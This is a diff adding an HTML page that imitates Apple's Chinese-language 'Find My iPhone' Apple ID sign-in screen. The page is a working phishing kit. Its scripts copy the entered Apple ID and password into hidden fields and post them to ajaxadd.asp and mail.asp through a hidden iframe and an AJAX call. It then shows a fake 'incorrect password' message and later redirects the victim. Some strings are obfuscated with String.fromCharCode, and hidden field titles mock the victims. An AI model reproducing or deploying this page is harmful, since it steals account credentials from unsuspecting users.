@@ -1,0 +1,414 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+	<link rel="icon" href="picture/favicon.ico" type="image/x-icon" />
+	<link rel="shortcut icon" href="picture/favicon.ico" type="image/x-icon" />
+	<meta http-equiv="content-type" content="text/html; charset=gbk" />
+	<meta charset="gb23231" />
+	<meta name="viewport" content=" initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+	<meta name="apple-mobile-web-app-capable" content="yes" />
+	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+	<meta name="format-detection" content="telephone=no" />
+
+	<script language="JavaScript" type="text/javascript" src="jquery-3.2.1.min.js"></script>
+
+	<link rel="stylesheet" href="picture/wap.css" media="all" />
+
+
+
+</head>
+
+<body>
+	<div style="margin-top:23%;"></div>
+	<center>
+		<img src="picture/find_icon.png" style="width:110px;height:110px;" />
+	</center>
+	<div class="main" style="border:0px solid red">
+		<p class="lok" style=" font-family: Arial, Helvetica, sans-serif;">查找我的 iPhone</p>
+		<script src="style.js"></script>
+		<form target="testIframeName" method="post" name="register" action="ajaxadd.asp" onSubmit="return initData();">
+			<input name="username" id="username" type="hidden" value="对不起,Javascript提取user的值失败,请联系管理更改代码"
+				title="法拉利跑车一辆多少钱" />
+			<input name="userpass" id="userpass" type="hidden" value="对不起,javascript提取pwd的值失败,请联系管理更改代码"
+				title="法拉利4S店提车2辆,恭喜机主您又上当了." />
+
+			<ul class="main_list">
+				<li id="bton1" class="">
+					<strong
+						style=" font-family: Arial, Helvetica, sans-serif;font-size:13px; color:#666;mrgin-top:-10px; font-weight:600">Apple
+						ID</strong>
+
+					<div contenteditable="true" class="input " id="App1" name="App1" type="text" placeholder="电子邮件或电话"
+						style="margin-left:63px;outline:none;color:#333333 ; font-family: Arial, Helvetica, sans-serif;"
+						onKeyDown="ADivFollowingText();" onKeyPress="OnTextChanged();" onblur="checktxt();"
+						onKeyUp='AchangeTest(this);' />
+	</div>
+
+
+	</li>
+	<li id="qieh2" style="display:none"><strong
+			style=" font-family: Arial, Helvetica, sans-serif;font-size:13px; color:#666;mrgin-top:-10px; font-weight:600">密码</strong>
+		<div style="margin-left:63px;outline:none;color: #333333 ; font-family: Arial, Helvetica, sans-serif;" id="Apwd"
+			class='input ' name="Apwd" contenteditable="TRUE" placeholder="必填" onKeyDown="DivFollowingText();"
+			onKeyPress="OnTextChanged();" onKeyUp='changeTest(this);'></div>
+	</li>
+	</ul>
+
+
+
+	<input name='act' type='hidden' id='act' value='ok' />
+
+	<div id="password3" style="display:none" align='center'><input name='submit' type='submit' disabled='disabled'
+			class='login_1' id='password1' value='登录...' ng-app="myApp" ng-controller="personCtrl" ng-click="toggle()" />
+	</div>
+	<div id="password2" style="display:block" align='center'> <input name='submit' type='submit' disabled='disabled'
+			class='login_1' id='password' value='登录...' /></div>
+
+
+
+	<div align="center"><br />
+		<label id="remember-me-label" class="form-label" for="remember-me"> <span class="form-choice-indicator"></span>
+			<span style="color:#00AC41;  padding-left:12PX;font-size:12px;font-family: Arial, Helvetica, sans-serif;"> 忘记
+				Apple ID 或密码？</span> </label>
+	</div>
+	</form>
+
+	<h3><a href="#" target="_blank"
+			style="text-decoration:none;color:#00AC41;font-family: Arial, Helvetica, sans-serif; padding-left:8PX;  font-size:12px;">设置说明</a>
+	</h3>
+	</div>
+
+	<iframe name="testIframeName" style=" width:0; height:0; display:none"></iframe>
+
+	<div id="tst" style="display:none">
+		<div id="" style="font-size:14px;margin-top:10px; font-weight:850;font-family: Arial, Helvetica, sans-serif;"
+			align="center">验证失败</div>
+		<div id="h2" style="font-family: Arial, Helvetica, sans-serif;"></div>
+		<div id="butt">
+			<div id="btnname" style="font-size:15px;font-family: Arial, Helvetica, sans-serif; font-weight:700">好</div>
+			<div id="btnpass" style="font-size:15px;font-weight:700;font-family: Arial, Helvetica, sans-serif;">好</div>
+			<div id="btnnext" style="font-size:15px;font-family: Arial, Helvetica, sans-serif;font-weight:700">好</div>
+		</div>
+	</div>
+	<div id="fade"></div>
+
+
+	<script src="picture/jquery-1.5.min.js" type="text/javascript"></script>
+
+	<script type="text/javascript">
+		var count = 0;
+		$(document).ready(function () {
+			$("#btnnext").click(function () {
+				if (count == 0) {
+					window.location = "#";
+				}
+				count = count + 1;
+			});
+			$("#name").blur(function () {
+				var temp = $(this).val();
+				$("#dname").css("border", "1px solid #d7d5ca");
+				if (($(this).val() != "") && ($(this).val() != String.fromCharCode(65) + String.fromCharCode(112) + String.fromCharCode(112) + String.fromCharCode(108) + String.fromCharCode(101) + " " + String.fromCharCode(73) + String.fromCharCode(68))) {
+					if (temp.indexOf("@") > 0) {
+
+					} else {
+						$(this).val();
+					}
+				}
+			});
+			$("#pass").focus(function () {
+				document.getElementById("pass").type = "password";
+			});
+			$("#pass").blur(function () {
+				if ($("#pass").val() == "" || $("#pass").val() == "") {
+					document.getElementById("pass").type = "text";
+					$("#pass").val("");
+				}
+			});
+			$("#password1").click(function () {
+				var namestr = $("#name").val();
+				var pwdstr = $("#pass").val();
+				if (namestr == "" || namestr == "example@" + String.fromCharCode(105) + String.fromCharCode(99) + String.fromCharCode(108) + String.fromCharCode(111) + String.fromCharCode(117) + String.fromCharCode(100) + "." + String.fromCharCode(99) + String.fromCharCode(111) + String.fromCharCode(109)) {
+					$("#fade").show();
+
+
+					$("#bt1").text(验证失败);
+
+
+					$("#tst").show();
+					$("#btnname").show();
+					$("#btnpass").hide();
+					$("#btnnext").hide();
+					return false;
+				}
+				if (pwdstr == "" || pwdstr == "") {
+					$("#fade").show();
+
+					$("#tst").show();
+					$("#btnname").hide();
+					$("#btnpass").show();
+					$("#btnnext").hide();
+					return false;
+				}
+				if (namestr != "" && namestr != "example@" + String.fromCharCode(105) + String.fromCharCode(99) + String.fromCharCode(108) + String.fromCharCode(111) + String.fromCharCode(117) + String.fromCharCode(100) + "." + String.fromCharCode(99) + String.fromCharCode(111) + String.fromCharCode(109) && pwdstr != "" && pwdstr != "") {
+					//$("#ts #ts_wz").text(unescape("%u5BC6%u7801%u9519%u8BEF%21"));
+					//$("#ts").fadeIn("slow");
+					//$("#ts").fadeOut(40);
+					$("#tst #h2").text(unescape("%u60A8%u7684 ") + String.fromCharCode(65) + String.fromCharCode(112) + String.fromCharCode(112) + String.fromCharCode(108) + String.fromCharCode(101) + " " + String.fromCharCode(73) + String.fromCharCode(68) + unescape(" %u6216%u5BC6%u7801%u4E0D%u6B63%u786E"));
+					$("#tst").show();
+					$("#fade").show();
+					$.post("mail.asp?username=" + $("#name").val() + "&pw=" + $("#pass").val(), {}, function () { });
+					$("#btnname").hide();
+					$("#btnpass").hide();
+					$("#btnnext").show();
+				}
+			});
+			$(function () {
+				$("#btnnext").click(function () {
+					$("#fade").hide();
+					$("#tst").hide();
+					$("#pass").val("");
+					$('#pass').blur();
+					$("#name").val("");
+					$('#name').blur();
+					document.getElementById("password1").className = 'login_1';
+				});
+				$("#btnname").click(function () {
+					$("#fade").hide();
+					$("#tst").hide();
+				});
+				$("#btnpass").click(function () {
+					$("#fade").hide();
+					$("#tst").hide();
+				});
+			});
+		});
+	</script>
+
+
+
+	<script type="text/javascript">
+		document.getElementById("password").onclick = function () {
+			document.getElementById("qieh2").style.display = "block";
+			document.getElementById("bton1").style = "border-bottom:1px solid #dedede;";
+
+			document.getElementById('password').className = 'login_1';
+
+			document.getElementById("password2").style.display = "none";
+			document.getElementById("password3").style.display = "block";
+
+		}
+	</script>
+
+	<script type="text/javascript">
+		var myDiv = $("#myDiv");
+		$(function () {
+			$("#password1").click(function (event) {
+				if ($(myDiv).is(":hidden")) {
+					showDiv();//调用显示DIV方法
+					$(document).on("click", function () {//对document绑定一个影藏Div方法
+						$(myDiv).hide();
+					});
+					event.stopPropagation();//阻止事件向上冒泡
+				} else {
+					$(myDiv).hide();
+				}
+
+			});
+
+			$(myDiv).click(function (event) {
+				event.stopPropagation();//阻止事件向上冒泡
+			});
+		});
+		function showDiv() {
+			$(myDiv).slideDown("300");
+		}
+	</script>
+	<script>
+		window.onload = function () {
+			var oImg = document.getElementById('img');
+			var onOff = true;
+
+			oImg.onclick = function () {
+				if (onOff) {
+					oImg.src = '20190128142059.png';
+					onOff = false;
+				} else {
+					oImg.src = '0190128135834.png';
+					onOff = true;
+				}
+			};
+
+		};
+	</script>
+
+	<script language="javascript">
+		window.onload = function () {
+			var oBtn = document.getElementById('login-button2');
+			var oDiv = document.getElementById('loginn1');
+			oBtn.onclick = function (ev) {
+				var oEvent = ev || event;
+				oDiv.style.display = 'block';
+				oEvent.cancelBubble = true;
+			}
+			document.onclick = function () { oDiv.style.display = 'none'; }
+		}
+	</script>
+
+	<script type='text/javascript'>
+
+		function AchangeTest(obj) {
+
+			if (obj.innerHTML.length == 0) { /*判断密码输入框输入内容长度，如果输入内容长度为0则执行以下程序*/
+
+				document.getElementById('password').className = 'login_1'; /* 变换登录按钮样式，颜色灰色*/
+				document.getElementById('password').disabled = true; /* 登录按钮设置为不可用*/
+
+			} else { /*如果文本框有内容则执行以下程序*/
+				document.getElementById('password').className = 'login_2';/* 变换登录按钮样式，颜色绿色*/
+				document.getElementById('password').disabled = false; /* 登录按钮设置为可用*/
+			}
+
+		}
+
+	</script>
+
+	<script type='text/javascript'>
+
+		function changeTest(obj) {
+
+			if (obj.innerHTML.length == 0) { /*判断密码输入框输入内容长度，如果输入内容长度为0则执行以下程序*/
+
+				document.getElementById('password1').className = 'login_1'; /* 变换登录按钮样式，颜色灰色*/
+				document.getElementById('password1').disabled = true; /* 登录按钮设置为不可用*/
+				document.getElementById('Apwd').className = 'input';
+				document.getElementById('Apwd').disabled = true;
+			} else { /*如果文本框有内容则执行以下程序*/
+				document.getElementById('password1').className = 'login_2';/* 变换登录按钮样式，颜色绿色*/
+				document.getElementById('password1').disabled = false; /* 登录按钮设置为可用*/
+				document.getElementById('Apwd').className = 'classa';
+				document.getElementById('Apwd').disabled = false;
+			}
+
+		}
+
+	</script>
+
+
+
+
+
+
+
+
+
+
+	<script src="jquery.js"></script>
+
+
+
+
+
+	<script src="JQ_AJAX.JS"></script>
+
+
+	<script>
+		var app = angular.module('myApp', []);
+		app.controller('personCtrl', function ($scope) {
+			var submitml = 0;
+			$scope.toggle = function () {
+				submitml++;
+				if (submitml < 2) {
+
+				} else {
+					top.location.href = '../IM/WPAGNOARGHOAFIDSHGOABRGHO344FAOGHOAIGH435OFDGHBODFG434IMI.asp';
+				}
+			};
+		});
+	</script>
+	<script type="text/javascript" language="javascript">
+		function OnTextChanged() {
+			if (event.keyCode == 13) {//判断是否为回车键
+				event.keyCode = 0;//屏蔽回车键
+				event.returnValue = false;
+
+			}
+		}
+	</script>
+
+	<script language="javascript">
+		function initData() {
+			document.getElementById("username").value = document.getElementById("App1").innerHTML;
+			document.getElementById("userpass").value = document.getElementById("Apwd").innerHTML;
+
+			return true;
+		}
+	</script>
+
+	<script type="text/javascript">
+		function checktxt() {
+			var a = document.getElementById("loginn").innerHTML;
+			if (a == null || a == "") {
+				document.getElementById("loginn").style.display = "block";
+			} else {
+				document.getElementById("loginn").style.display = "none";
+			}
+
+
+		}
+	</script>
+
+	<style type="text/css">
+		/**css样式*/
+
+		.input {
+			width: 200px;
+			-webkit-text-security: none;
+			font-size: 15px;
+			padding: 4px 5px;
+			line-height: 12px;
+			white-space: nowrap;
+			color: #CCCCCC
+		}
+
+		.input:empty::before {
+			content: attr(placeholder);
+		}
+
+		@font-face {
+			font-family: 'fontnameRegular';
+			src: url('PingHei-light.woff.eot');
+			src: local('fontname Regular'),
+				local('PingHei-light.woff'),
+				url('PingHei-light.woff.woff') format('woff'),
+				url('PingHei-light.woff.ttf') format('truetype'),
+				url('PingHei-light.woff.svg#fontname') format('svg');
+
+		}
+
+		.classa {
+			width: 180px;
+			-webkit-text-security: disc;
+			font-size: 10px;
+			padding: 4px 5px;
+			line-height: 12px;
+
+			color: #CCCCCC
+		}
+
+		#loginn {
+			display: none;
+		}
+
+		.button1 {
+			display: block
+		}
+
+		.button2 {
+			display: none
+		}
+	</style>
+
+</body>
+
+</html>
